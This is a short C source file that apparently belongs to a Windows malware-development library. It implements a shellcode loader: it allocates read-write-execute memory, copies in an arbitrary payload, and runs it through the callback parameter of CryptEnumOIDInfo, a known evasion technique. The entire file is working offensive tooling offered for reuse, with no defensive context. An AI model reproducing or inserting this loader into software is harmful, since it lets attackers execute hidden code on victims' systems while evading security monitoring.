#include "Win32Helper.h"

#include "Win32Helper.h"

VOID InvokeCryptEnumOIDInfoCallbackRoutine(LPVOID lpParameter)
{
	CryptEnumOIDInfo(NULL, NULL, NULL, (PFN_CRYPT_ENUM_OID_INFO)lpParameter);
}

BOOL MpfSceViaCryptEnumOIDInfo(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeCryptEnumOIDInfoCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}